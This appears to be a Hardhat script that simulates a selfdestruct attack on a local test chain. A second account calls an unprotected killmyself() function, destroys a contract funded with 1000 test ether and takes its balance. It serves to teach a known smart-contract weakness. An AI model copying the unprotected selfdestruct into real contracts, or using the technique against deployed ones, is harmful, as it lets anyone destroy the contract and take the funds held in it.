//
// @dev Simulate an selfdestruct func attack
// @description selfdestruct func can destruct contract code on blockchain and
// transfer all contract balance to selfdestruct caller
//
// @reference https://cloud.tencent.com/developer/article/1606984?from=article.detail.1595551
//

const { ethers } = require('hardhat');

async function main() {
    const [ owner, user ] = await ethers.getSigners();
    const Selfdestruct = await ethers.getContractFactory('Selfdestruct', owner);
    const selfdestruct = await Selfdestruct.deploy();
    await selfdestruct.deployed();
    console.log(`selfdestruct addr: ${selfdestruct.address}`);

    console.log(`\nowenr balance: ${ethers.utils.formatEther(await owner.getBalance())} ether`);
    console.log(`owner send 1000 Ether to Selfdestruct contract...`);
    let tx = owner.sendTransaction({
        to: selfdestruct.address,
        gasPrice: 966828498,
        value: ethers.utils.parseEther('1000.0')
    });
    (await tx).wait;

    console.log(`owenr balance: ${ethers.utils.formatEther(await owner.getBalance())} ether`);
    console.log(`contract Selfdestruct balance: ${ethers.utils.formatEther(await selfdestruct.provider.getBalance(selfdestruct.address))} ether`);

    console.log(`\nowner try to call num()...`);
    console.log(`num: ${await selfdestruct.num()}`);
    console.log(`user balance: ${ethers.utils.formatEther(await user.getBalance())} ether`);
    console.log(`user call killmyself()...`);
    await selfdestruct.connect(user).killmyself(user.address);
    console.log(`user balance: ${ethers.utils.formatEther(await user.getBalance())} ether`);

    // revert because contract code was destructed when user call selfdestruct...
    console.log(`\nowner try to call num()...`);
    console.log(`num: ${await selfdestruct.num()}`);
}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });